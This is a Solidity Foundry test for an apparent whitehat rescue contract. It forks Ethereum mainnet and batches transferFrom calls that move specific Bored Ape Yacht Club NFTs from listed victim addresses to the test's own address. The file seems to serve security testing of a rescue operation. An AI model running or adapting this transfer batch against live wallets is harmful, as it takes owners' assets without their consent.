// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import {IERC721} from "forge-std/interfaces/IERC721.sol";
import {Whitehat, CallData} from "../src/Whitehat.sol";

contract WhitehatTest is Test {
    Whitehat public whitehat;
    uint256 mainnetFork;
    CallData[] calls;
    IERC721 BAYC = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
    uint256[] apeTokenIds;
    address[] victims;
    string MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");

    function setUp() public {
        mainnetFork = vm.createFork(MAINNET_RPC_URL);
        vm.selectFork(mainnetFork);
        vm.rollFork(18802260);

        vm.prank(address(1));
        whitehat = new Whitehat();
        vm.makePersistent(address(whitehat)); // https://book.getfoundry.sh/cheatcodes/make-persistent
    }

    function testWhitehat() public {
        vm.selectFork(mainnetFork);
        assertEq(vm.activeFork(), mainnetFork);

        apeTokenIds.push(6936);
        victims.push(0xf15C93562bc3944a68e938ef75D2A3360D98ca57);

        apeTokenIds.push(5271);
        victims.push(0xf15C93562bc3944a68e938ef75D2A3360D98ca57);

        apeTokenIds.push(6255);
        victims.push(0x0097b9cFE64455EED479292671A1121F502bc954);

        apeTokenIds.push(9488);
        victims.push(0x8607a7D180de23645Db594D90621d837749408d5);

        apeTokenIds.push(4523);
        victims.push(0x8607a7D180de23645Db594D90621d837749408d5);

        apeTokenIds.push(4112);
        victims.push(0x8607a7D180de23645Db594D90621d837749408d5);

        apeTokenIds.push(5914);
        victims.push(0x8607a7D180de23645Db594D90621d837749408d5);

        apeTokenIds.push(5986);
        victims.push(0x8607a7D180de23645Db594D90621d837749408d5);

        apeTokenIds.push(6019);
        victims.push(0x8607a7D180de23645Db594D90621d837749408d5);

        apeTokenIds.push(6074);
        victims.push(0x8607a7D180de23645Db594D90621d837749408d5);

        apeTokenIds.push(638);
        victims.push(0x8607a7D180de23645Db594D90621d837749408d5);

        apeTokenIds.push(6517);
        victims.push(0x8607a7D180de23645Db594D90621d837749408d5);

        apeTokenIds.push(5864);
        victims.push(0x3FB65FEEAB83bf60B0D1FfBC4217d2D97a35C8D4);

        apeTokenIds.push(8272);
        victims.push(0xf5225e8312758F962E4ecfd8a4fcaf32f8d3e982);


        for (uint256 i = 0; i < apeTokenIds.length; i++) {
            CallData memory call = CallData(
                address(BAYC), 
                abi.encodeWithSelector(IERC721.transferFrom.selector, victims[i], address(1), apeTokenIds[i])
            );
            calls.push(call);
        }
        console.log("BAYC Balance Before:", BAYC.balanceOf(address(1)));
        vm.prank(address(1));
        whitehat.start(calls);
        console.log("BAYC Balance After:", BAYC.balanceOf(address(1)));
    }
}
